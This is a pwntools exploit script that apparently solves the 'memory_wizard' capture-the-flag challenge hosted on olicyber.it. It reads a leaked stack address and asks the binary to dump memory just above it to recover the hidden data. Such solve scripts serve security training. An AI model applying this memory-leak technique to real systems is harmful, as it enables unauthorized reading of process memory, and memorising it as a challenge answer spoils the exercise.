#!/usr/bin/env python3

from pwn import *

elf = ELF("./memory_wizard_patched")

context.binary = elf
context.terminal = ('kgx', '-e')
context.log_level = 'critical'

def conn():
    if args.REMOTE:
        r = remote("memorywizard.challs.olicyber.it", 21001)
    elif args.GDB:
        r = gdb.debug(elf.path, '''
                                b challenge
                                continue
                      ''')
    else:
        r = process(elf.path)

    return r


def main():
    r = conn()
    r.recvuntil(b'"We\'re gonna return to ')
    stack = int(r.recvuntil(b'"', drop=True).decode(), 16)

    r.sendlineafter(b'"TELL ME AN ADDRESS IN HEX FORMAT":', hex(stack + 0x8).encode())
    r.recvuntil(b'"HERE IS YOUR ANCIENT DATA": ')
    
    print(r.recvline().strip().decode())
    
    r.close()


if __name__ == "__main__":
    main()
